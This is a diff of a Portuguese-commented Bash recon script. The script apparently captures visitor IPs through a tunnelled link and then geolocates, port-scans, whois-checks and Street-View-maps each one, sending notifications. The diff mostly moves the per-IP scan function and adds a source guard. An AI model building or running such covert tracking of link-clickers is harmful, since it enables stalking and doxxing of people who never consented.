@@ -50,59 +50,6 @@ Dependências: php, curl, jq, whois, cloudflared, ngrok, loclx
 EOF
 }
 
-# ========== PROCESSAR IP (SCAN) ==========
-processar_ip() {
-    local ip=$1
-    if ! validar_ip "$ip"; then
-        log_error "IP inválido: $ip"
-        return 1
-    fi
-    
-    log_info "Iniciando scan para IP: $ip"
-    local pasta=$(criar_pasta_recon "$ip")
-    log_success "Pasta criada: $pasta"
-    
-    # --- Módulo GEO ---
-    geo_lookup "$ip" "$pasta"
-    if [ $? -ne 0 ]; then
-        log_error "Geo falhou, continuando mesmo assim..."
-    fi
-    
-    # --- Módulo CLIMA (precisa de LAT/LON do GEO) ---
-    get_weather "$LAT" "$LON" "$pasta"
-    
-    # --- Módulo PORTAS ---
-    scan_ports "$ip" "$pasta"
-
-    # --- Módulo WHOIS ---
-    whois_lookup "$ip" "$pasta"
-
-    # --- STREET VIEW (precisa de LAT/LON) ---
-    get_streetview "$LAT" "$LON" "$pasta"
-
-    # --- RELATÓRIO HTML ---
-    gerar_relatorio "$ip" "$pasta"
-    
-    # Salva um resumo rápido
-    cat > "$pasta/resumo.txt" <<EOF
-IP: $ip
-Data: $(formatar_data)
-Cidade: $CITY
-Região: $REGION
-País: $COUNTRY
-ISP: $ISP
-Coordenadas: $LAT, $LON
-Clima: $CLIMA
-EOF
-    
-    # --- NOTIFICACOES ---
-    send_notifications "$ip" "$pasta"
-
-    log_success "Scan finalizado! Resumo salvo em $pasta/resumo.txt"
-    log_success "Arquivos gerados:"
-    ls -la "$pasta"
-}
-
 # ========== MODO SERVIDOR (LINK) ==========
 modo_servidor() {
     log_info "Modo Link ativado."
@@ -132,7 +79,7 @@ modo_servidor() {
             local new_ip=$(cat captures/last_ip.txt)
             if [ "$new_ip" != "$last_ip" ] && [ -n "$new_ip" ]; then
                 log_success "Nova captura: IP $new_ip"
-                ./super_recon.sh -s "$new_ip" &
+                processar_ip "$new_ip" &
                 last_ip="$new_ip"
             fi
         fi
@@ -147,6 +94,8 @@ modo_servidor() {
 trap 'cleanup_tunnels; kill $(jobs -p) 2>/dev/null; exit' INT
 
 # ========== PARSER DE ARGUMENTOS ==========
+# So executa se for chamado diretamente (nao quando source'd)
+if [ "${BASH_SOURCE[0]}" = "${0}" ]; then
 case "$1" in
     -s|--scan)
         if [ -z "$2" ]; then
@@ -162,3 +111,4 @@ case "$1" in
         modo_servidor
         ;;
 esac
+fi
